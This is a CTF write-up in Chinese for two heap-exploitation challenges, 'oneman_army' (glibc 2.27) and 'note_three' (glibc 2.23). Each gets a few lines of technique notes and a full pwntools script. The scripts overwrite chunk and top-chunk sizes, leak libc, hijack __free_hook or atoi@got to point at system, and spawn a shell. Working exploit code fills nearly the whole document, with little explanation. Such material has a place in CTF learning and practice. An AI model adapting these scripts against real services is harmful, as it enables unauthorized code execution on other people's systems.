# oneman_army

环境是`Ubuntu18`,`libc2.27`

用`0x2333`的功能溢出覆盖一个`chunk`的`size`为`0x501`，然后释放掉即可

```python=

from pwn import *

context.arch="amd64"

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("Your choice: ")
	p.sendline(str(command))

def add(sz,content):
	cmd(1)
	p.recvuntil("Size: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)
		
def dele():
	cmd(3)
	
def show():
	cmd(2)
	
	

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./oneman_army")
		# debug(0x0000000000000EC7)
		gdb.attach(p)
	add(0x60,"A"*8)
	dele()
	add(0x70,"A"*8)
	dele()
	add(0x80,"A"*8)
	dele()
	for i in range(4):
		add(0x180,(p64(0)+p64(0x21))*0x18)
	add(0x60,"A"*8)
	cmd(0x2333)
	payload = "A"*0x68+p64(0x501)
	p.send(payload)
	add(0x70,"A"*8)
	dele()
	
	add(0x50,"A")
	show()
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-0x3ec041
	success('libc : '+hex(libc.address))
	add(0x100,"\x00"*0x18+p64(0x91)+p64(libc.symbols["__free_hook"]))
	add(0x80,"A"*8)
	add(0x80,p64(libc.symbols["system"]))
	add(0x10,"/bin/sh\x00")
	dele()
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc-2.27.so",checksec=False)
	main(args['REMOTE'])

```

# note_three

环境是`Ubuntu16`,`libc2.23`

先溢出覆盖`top_chunk`的`size`，多次申请，可以得到一个`free`的`chunk`

然后是用`'\x00'`截断让`strdup`的申请的堆块`size`小于我们输入的`size`,`edit`的时候就可以堆溢出了

然后改`atoi@got`为`puts`泄露，在改成`system`来`getshell`

```python=
from pwn import *

context.arch="amd64"

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("choice>> ")
	p.sendline(str(command))

def add(idx,sz,content):
	cmd(1)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("size: ")
	p.sendline(str(sz))
	p.recvuntil("content: ")
	p.send(content)
		
def edit(idx,content):
	cmd(2)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("content: ")
	p.send(content)

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./note_three")
		# debug(0x0000000000000EC7)
		# gdb.attach(p,"b *0x000000000400BC5")
	add(0,0x90,"A")
	edit(0,"\x00"*0x18+p64(0xfe1))
	for i in range(0x18):
		add(0,0x90,"A"*0x89)
	
	add(1,0x90,"A"*0x40+"\x00")
	add(0,0x90,"A"*0x90)
	content = 0x0000000006020C0
	edit(1,"\x00"*0x48+p64(0x71)+p64(content+0x80))
	add(0,0x90,"A"*0x60)
	add(0,0x90,"A"*0x60+"\x00"*0x28+p64(0x71))
	edit(0,"\x00"*0x70+p64(0)+p64(0x100)+p64(content+0x100)+p64(0x100))
	edit(1,p64(elf.got["atoi"])+p64(0x100)+p64(elf.got["atoi"])+p64(0x100)+p64(content+0x100)+p64(0x100))
	gdb.attach(p,"b *0x000000000400BC5")
	edit(0,p64(0x0000000004006D0))
	p.recvuntil("choice>> ")
	p.send("A"*8)
	p.recvuntil("A"*8)
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-libc.symbols["_IO_2_1_stdout_"]
	success('libc : '+hex(libc.address))
	#edit 0
	p.recvuntil("choice>> ")
	p.send("A\x00")
	p.recvuntil("idx: ")
	p.send("\x00")
	p.recvuntil("content: ")
	p.send(p64(libc.symbols["system"]))
	p.recvuntil("choice>> ")
	p.send("/bin/sh\x00")
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so.6",checksec=False)
	elf = ELF("./note_three",checksec=False)
	main(args['REMOTE'])

```



